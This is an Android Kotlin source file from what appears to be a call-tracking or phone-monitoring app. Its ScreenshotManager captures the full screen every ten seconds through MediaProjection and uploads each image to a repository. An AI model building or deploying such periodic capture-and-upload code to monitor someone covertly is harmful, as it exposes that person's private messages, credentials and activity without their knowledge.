package com.example.calltracker.service

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.example.calltracker.repository.TrackerRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

class ScreenshotManager(
    private val context: Context,
    private val resultCode: Int,
    private val resultData: Intent,
    private val repository: TrackerRepository
) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    private val captureJob = Job()
    private val captureScope = CoroutineScope(Dispatchers.IO + captureJob)

    fun start() {
        Log.d("ScreenshotManager", "start() called with resultCode: $resultCode")
        val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)

        if (mediaProjection == null) {
            Log.e("ScreenshotManager", "Failed to get MediaProjection")
            return
        }
        Log.d("ScreenshotManager", "MediaProjection acquired successfully")

        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        windowManager.defaultDisplay.getRealMetrics(metrics)

        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        // Using RGBA_8888 for Screen Capture
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )
        
        Log.d("ScreenshotManager", "VirtualDisplay created: ${width}x${height}")

        captureScope.launch {
            Log.d("ScreenshotManager", "Starting capture loop")
            while (isActive) {
                Log.d("ScreenshotManager", "Capturing screenshot...")
                captureAndUploadScreenshot(width, height)
                delay(10000L) // 10 seconds
            }
        }
    }

    private suspend fun captureAndUploadScreenshot(width: Int, height: Int) {
        var image: Image? = null
        var bitmap: Bitmap? = null
        try {
            image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                // Create bitmap
                bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // If rowPadding > 0, we need to crop the bitmap to actual screen size
                if (rowPadding > 0) {
                    val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    bitmap.recycle()
                    bitmap = cropped
                }

                // Save to file
                val time = System.currentTimeMillis()
                val file = File(context.cacheDir, "screenshot_$time.jpg")
                FileOutputStream(file).use { out ->
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
                }

                Log.d("ScreenshotManager", "Screenshot captured and saved: ${file.absolutePath}")

                // Upload
                Log.d("ScreenshotManager", "Uploading screenshot...")
                repository.uploadScreenshot(file, time)

                // Clean up file after upload to save space
                if (file.exists()) {
                    file.delete()
                }
            } else {
                Log.w("ScreenshotManager", "acquireLatestImage() returned null")
            }
        } catch (e: Exception) {
            Log.e("ScreenshotManager", "Error capturing screenshot", e)
        } finally {
            bitmap?.recycle()
            image?.close()
        }
    }

    fun stop() {
        captureJob.cancel()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
    }
}
